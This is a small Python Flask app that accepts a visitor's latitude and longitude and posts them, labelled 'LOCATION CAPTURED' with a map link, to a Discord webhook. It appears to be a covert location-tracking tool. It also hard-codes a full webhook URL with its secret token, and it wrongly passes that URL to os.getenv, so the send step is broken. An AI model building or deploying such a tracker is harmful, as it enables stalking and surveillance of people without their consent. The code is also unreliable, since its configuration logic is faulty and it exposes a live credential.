from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

WEBHOOK_URL = os.getenv("https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B")  # Set this in Railway environment

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/send", methods=["POST"])
def send():
    data = request.json
    lat = data.get("lat")
    lon = data.get("lon")
    msg = {
        "content": f"📍 LOCATION CAPTURED\nLatitude: {lat}\nLongitude: {lon}\n🌐 https://maps.google.com/?q={lat},{lon}"
    }
    requests.post(WEBHOOK_URL, json=msg)
    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)